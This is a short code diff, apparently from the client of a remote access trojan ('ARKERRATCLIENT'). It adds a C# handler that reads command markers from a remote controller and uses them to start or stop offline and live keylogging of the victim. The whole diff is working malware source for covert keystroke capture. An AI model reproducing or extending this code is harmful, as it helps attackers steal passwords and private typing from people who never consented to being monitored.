@@ -17,6 +17,44 @@ namespace ARKERRATCLIENT2._0
 {
     static class KeyLogger
     {
+        public static void HandleData(string subString)
+        {
+            if (subString.Contains("§OFK§"))
+            {
+                subString = subString.Replace("§OFK§", string.Empty);
+
+                if (subString == "close")
+                {
+                    CloseOfflineKeyLogger();
+                }
+                else if (subString == "start")
+                {
+                    StartOfflineKeylogger();
+                }
+            }
+            else if (subString.Contains("§live§"))
+            {
+                subString = subString.Replace("§live§", string.Empty);
+
+                if (subString == "close")
+                {
+                    CloseLiveKeyLogger();
+                }
+                else if (subString == "start")
+                {
+                    StartLiveKeyLogger();
+                }
+            }
+            else if (subString == "start")
+            {
+                keyLoggingThread = Task.Run(() => StartKeyLogger());
+            }
+            else if (subString == "close")
+            {
+                StopKeyLogger();
+            }
+        }
+
         static KeyboardHookListener keystrokesListener;
         static bool keyLogging = false;
         public static Task keyLoggingThread;
